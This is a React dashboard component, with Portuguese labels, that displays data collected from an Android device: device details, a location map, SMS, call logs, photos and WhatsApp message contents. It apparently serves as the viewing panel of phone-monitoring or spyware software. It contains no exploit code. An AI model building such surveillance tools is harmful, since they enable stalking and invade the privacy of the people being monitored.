import React, { useEffect, useState } from 'react';
import MapView from './MapView';
import DataTable from './DataTable';
import PhotoGallery from './PhotoGallery';
import { getDeviceData } from '../services/api';

const Dashboard = () => {
  const [deviceData, setDeviceData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await getDeviceData();
        setDeviceData(response.data);
        setLoading(false);
      } catch (err) {
        setError('Erro ao carregar dados');
        setLoading(false);
        console.error(err);
      }
    };

    fetchData();
  }, []);

  if (loading) {
    return (
      <div className="flex justify-center items-center h-screen">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex justify-center items-center h-screen">
        <div className="text-red-500 text-xl">{error}</div>
      </div>
    );
  }

  if (deviceData.length === 0) {
    return (
      <div className="flex justify-center items-center h-screen">
        <div className="text-gray-500 text-xl">Nenhum dado encontrado</div>
      </div>
    );
  }

  const latestData = deviceData[0];
  const locations = deviceData.filter(d => d.location && d.location.lat);

  return (
    <div className="container mx-auto p-4">
      <h1 className="text-3xl font-bold mb-8 text-center">Painel de Monitoramento</h1>
      
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-8">
        <div className="bg-white p-6 rounded-lg shadow-md">
          <h2 className="text-xl font-semibold mb-4">Informações do Dispositivo</h2>
          <div className="space-y-2">
            <p><span className="font-medium">Modelo:</span> {latestData.deviceInfo?.model}</p>
            <p><span className="font-medium">Fabricante:</span> {latestData.deviceInfo?.manufacturer}</p>
            <p><span className="font-medium">Android:</span> {latestData.deviceInfo?.androidVersion}</p>
            <p><span className="font-medium">ID:</span> {latestData.deviceInfo?.deviceId}</p>
            <p><span className="font-medium">Última atualização:</span> {new Date(latestData.timestamp).toLocaleString()}</p>
          </div>
        </div>
        
        <div className="bg-white p-6 rounded-lg shadow-md lg:col-span-2">
          <h2 className="text-xl font-semibold mb-4">Localização</h2>
          <MapView locations={deviceData} />
        </div>
      </div>
      
      <div className="bg-white p-6 rounded-lg shadow-md mb-8">
        <h2 className="text-xl font-semibold mb-4">Dados Coletados</h2>
        
        <DataTable data={latestData.sms} type="sms" />
        <DataTable data={latestData.calls} type="calls" />
        <PhotoGallery photos={latestData.photos} />
        
        {latestData.whatsapp && latestData.whatsapp.messages.length > 0 && (
          <div className="mb-6">
            <h3 className="text-xl font-semibold mb-2">
              WhatsApp <span className="text-sm font-normal text-gray-600">({latestData.whatsapp.messages.length} mensagens)</span>
            </h3>
            <div className="bg-gray-50 p-4 rounded max-h-60 overflow-y-auto">
              {latestData.whatsapp.messages.map((msg, index) => (
                <div key={index} className="mb-3 pb-3 border-b border-gray-200 last:border-0">
                  <p className="whitespace-pre-wrap">{msg}</p>
                  <p className="text-xs text-gray-500 mt-1">
                    {index === 0 ? 'Mais recente' : ''}
                  </p>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Dashboard;
